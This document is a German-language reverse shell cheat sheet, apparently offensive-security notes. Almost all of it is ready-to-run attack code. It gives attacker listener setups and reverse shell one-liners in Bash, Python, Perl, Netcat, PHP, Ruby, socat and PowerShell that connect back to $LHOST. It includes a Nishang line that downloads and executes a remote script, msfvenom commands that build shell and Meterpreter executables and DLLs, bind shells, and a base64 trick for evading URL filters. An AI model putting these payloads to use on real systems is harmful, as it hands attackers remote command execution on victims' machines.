# 🐚 Reverse Shells

> Variablen: `$LHOST` = deine IP, `$LPORT` = dein Listener-Port (z.B. 4444).

## Listener (auf Angreifer)

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444                    # mit history & arrows
pwncat-cs -lp 4444                       # Auto-Upgrade & nice features

# msfconsole
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set lhost tun0; set lport 4444; run"
msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set lhost tun0; set lport 4444; run"
```

---

## 🐧 Linux Targets

### Bash

```bash
bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'
bash -c 'exec bash -i &>/dev/tcp/$LHOST/4444 <&1'

# In URL-Kontext (encoded /):
bash -c "0<&196;exec 196<>/dev/tcp/$LHOST/4444; sh <&196 >&196 2>&196"
```

### Python

```bash
python -c 'import os,pty,socket;s=socket.socket();s.connect(("'$LHOST'",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("'$LHOST'",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

### Perl

```perl
perl -e 'use Socket;$i="'$LHOST'";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### Netcat

```bash
nc -e /bin/bash $LHOST 4444                          # mit -e (selten)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST 4444 >/tmp/f    # ohne -e
```

### PHP

```php
php -r '$sock=fsockopen("'$LHOST'",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("'$LHOST'","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### socat (BEST! direkt PTY)

```bash
# Auf Angreifer:
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Auf Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:4444
```

---

## 🪟 Windows Targets

### PowerShell (Klassiker)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$LHOST',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Nishang (Invoke-PowerShellTcp)

```powershell
# Auf Target laden + ausführen:
IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $LHOST -Port 4444
```

### nc.exe (statisch kompiliert)

```cmd
nc.exe -e cmd $LHOST 4444
```

### msfvenom-generated

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o shell

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o shell.exe

# Windows EXE — meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o meter.exe

# Windows DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f dll -o shell.dll
```

## Bind Shell (umgekehrt — du connectest zum Target)

```bash
# Wenn outbound geblockt aber inbound offen
# Auf Target:
nc -lvnp 4444 -e /bin/bash             # Linux
nc.exe -lvnp 4444 -e cmd.exe           # Windows

# Auf Angreifer:
nc $RHOST 4444
```

## Encoding für URL-Kontext

```bash
# Base64 + bash decode
echo -n 'bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"' | base64
# → bash -c "{echo,BASE64STRING}|{base64,-d}|{bash,-i}"
```

## Schnell-Generator-URL

→ https://www.revshells.com/ — alles als Web-UI
